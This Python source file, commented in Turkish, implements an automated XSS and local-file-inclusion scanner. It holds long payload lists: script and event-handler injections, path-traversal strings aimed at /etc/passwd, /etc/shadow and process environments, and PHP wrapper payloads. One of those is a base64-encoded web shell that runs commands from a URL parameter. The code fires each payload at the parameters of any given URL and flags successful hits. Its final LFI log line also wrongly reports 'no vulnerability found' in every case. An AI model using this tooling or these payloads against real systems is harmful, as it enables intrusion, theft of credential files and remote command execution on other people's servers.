"""
VIRELOX XSS & LFI Tarayıcı v3.0 — Genişletilmiş Payload Havuzu
Mozilla Public License 2.0 — AltayHR Developers
"""
import re
import urllib.parse
from typing import List, Dict

XSS_PAYLOADLARI = [
    # Temel
    "<script>alert(1)</script>",
    "'\"><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<body onload=alert(1)>",
    "javascript:alert(1)",
    "<details open ontoggle=alert(1)>",
    "<input autofocus onfocus=alert(1)>",
    "<math><mtext></p><img src=1 onerror=alert(1)>",
    "'\"><img src=x onerror=alert(document.domain)>",
    # Kaçış
    "--><script>alert(1)</script>",
    "</script><script>alert(1)</script>",
    "<ScRiPt>alert(1)</ScRiPt>",
    # Encode
    "%3Cscript%3Ealert(1)%3C/script%3E",
    "&#60;script&#62;alert(1)&#60;/script&#62;",
    "%22%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E",
    # Event handler
    "<img src=1 onerror='alert(1)'>",
    "<iframe onload=alert(1)>",
    "<object data=javascript:alert(1)>",
    "<a href=javascript:alert(1)>click</a>",
    "<button onclick=alert(1)>X</button>",
    "<form action=javascript:alert(1)><button>X</button></form>",
    # Polyglot
    "jaVasCript:alert(1)//%0D%0A",
    "<svg/onload=alert(1)>",
    "';alert(1);//",
    "\";alert(1);//",
    # CSS based
    "<style>*{background:url(javascript:alert(1))}</style>",
    # Template injection
    "{{7*7}}", "${7*7}", "#{7*7}", "<%=7*7%>",
    # DOM based
    "#<img src=x onerror=alert(1)>",
    "?#<script>alert(1)</script>",
]

LFI_PAYLOADLARI = [
    # Linux
    "../../../etc/passwd",
    "../../../../etc/passwd",
    "../../../../../etc/passwd",
    "../../../../../../etc/passwd",
    "../../../../../../../etc/passwd",
    "../../../../../../../../etc/passwd",
    "....//....//....//etc/passwd",
    "..././..././..././etc/passwd",
    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "/etc/passwd",
    "/etc/shadow",
    "/etc/group",
    "/proc/self/environ",
    "/proc/version",
    "/proc/cmdline",
    "/var/log/apache2/access.log",
    "/var/log/apache/access.log",
    "/var/log/nginx/access.log",
    "/var/log/auth.log",
    "/etc/hosts",
    "/etc/hostname",
    "/etc/issue",
    # Windows
    "..\\..\\..\\windows\\win.ini",
    "../../../../windows/win.ini",
    "C:\\windows\\win.ini",
    "C:\\boot.ini",
    "..\\..\\..\\boot.ini",
    # PHP wrappers
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/convert.base64-encode/resource=config.php",
    "php://filter/read=string.rot13/resource=index.php",
    "php://input",
    "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
    "expect://id",
    # Null byte (eski PHP)
    "../../../etc/passwd%00",
    "../../../etc/passwd\x00",
]

LFI_ISARETLER = [
    r"root:x:0:0:",
    r"\[boot loader\]",
    r"for 16-bit app support",
    r"daemon:x:",
    r"bin:x:",
    r"nobody:x:",
    r"HTTP_USER_AGENT",
    r"DOCUMENT_ROOT",
    r"\[fonts\]",
    r"windows",
    r"\[extensions\]",
    r"bash",
    r"/sbin/nologin",
    r"Linux version",
    r"BOOT_IMAGE",
]


class XSSTarayici:
    def __init__(self, http_istemci, log_func=None):
        self.http = http_istemci
        self.log  = log_func or (lambda m: None)

    def _url_hazirla(self, url, param, deger):
        parsed = urllib.parse.urlparse(url)
        params = dict(urllib.parse.parse_qsl(parsed.query))
        params[param] = deger
        return urllib.parse.urlunparse((
            parsed.scheme, parsed.netloc, parsed.path,
            '', urllib.parse.urlencode(params), ''))

    def tara(self, url, param):
        bulunanlar = []
        toplam = len(XSS_PAYLOADLARI)
        self.log(f"[XSS] param='{param}' → {toplam} payload test ediliyor...")
        for i, payload in enumerate(XSS_PAYLOADLARI, 1):
            kisa = payload[:55] + "…" if len(payload) > 55 else payload
            self.log(f"[XSS] [{i:>2}/{toplam}] → {kisa}")
            test_url = self._url_hazirla(url, param, payload)
            try:
                yanit = self.http.get(test_url)
                if not yanit:
                    self.log(f"[XSS] [{i:>2}/{toplam}]   MISS: yanıt yok")
                    continue
                icerik = getattr(yanit,'text','')
                if payload in icerik or urllib.parse.quote(payload, safe='') in icerik or payload.lower() in icerik.lower():
                    bulunanlar.append({
                        "payload":payload,"url":test_url,
                        "yansima":True,"tip":"Reflected XSS"})
                    self.log(f"[XSS] [{i:>2}/{toplam}] ✓ AÇIK: {kisa}")
                    break
                else:
                    self.log(f"[XSS] [{i:>2}/{toplam}]   MISS: yansıma yok")
            except Exception as e:
                self.log(f"[XSS] [{i:>2}/{toplam}]   HATA: {str(e)[:30]}")
                continue
        if bulunanlar:
            self.log(f"[XSS] ✓ Tamamlandı: {param} parametresinde açık bulundu")
        else:
            self.log(f"[XSS] ○ Tamamlandı: {toplam}/{toplam} payload denendi, açık bulunamadı")
        return bulunanlar

    def coklu_param_tara(self, url, parametreler):
        sonuclar = {}
        for param in parametreler:
            s = self.tara(url, param)
            if s: sonuclar[param] = s
        return sonuclar


class LFITarayici:
    def __init__(self, http_istemci, log_func=None):
        self.http = http_istemci
        self.log  = log_func or (lambda m: None)

    def _url_hazirla(self, url, param, deger):
        parsed = urllib.parse.urlparse(url)
        params = dict(urllib.parse.parse_qsl(parsed.query))
        params[param] = deger
        return urllib.parse.urlunparse((
            parsed.scheme, parsed.netloc, parsed.path,
            '', urllib.parse.urlencode(params), ''))

    def tara(self, url, param):
        bulunanlar = []
        toplam = len(LFI_PAYLOADLARI)
        self.log(f"[LFI] param='{param}' → {toplam} payload test ediliyor...")
        for i, payload in enumerate(LFI_PAYLOADLARI, 1):
            kisa = payload[:55] + "…" if len(payload) > 55 else payload
            self.log(f"[LFI] [{i:>2}/{toplam}] → {kisa}")
            test_url = self._url_hazirla(url, param, payload)
            try:
                yanit = self.http.get(test_url)
                if not yanit:
                    self.log(f"[LFI] [{i:>2}/{toplam}]   MISS: yanıt yok")
                    continue
                icerik = getattr(yanit,'text','')
                eslesme = None
                for isaretci in LFI_ISARETLER:
                    if re.search(isaretci, icerik, re.IGNORECASE):
                        eslesme = isaretci
                        break
                if eslesme:
                    bulunanlar.append({
                        "payload":payload,"url":test_url,
                        "isaretci":eslesme,"tip":"LFI"})
                    self.log(f"[LFI] [{i:>2}/{toplam}] ✓ AÇIK: {kisa} (işaretçi: {eslesme})")
                else:
                    self.log(f"[LFI] [{i:>2}/{toplam}]   MISS: işaretçi yok")
            except Exception as e:
                self.log(f"[LFI] [{i:>2}/{toplam}]   HATA: {str(e)[:30]}")
                continue
        self.log(f"[LFI] ○ Tamamlandı: {toplam}/{toplam} payload denendi, açık bulunamadı")
        return bulunanlar
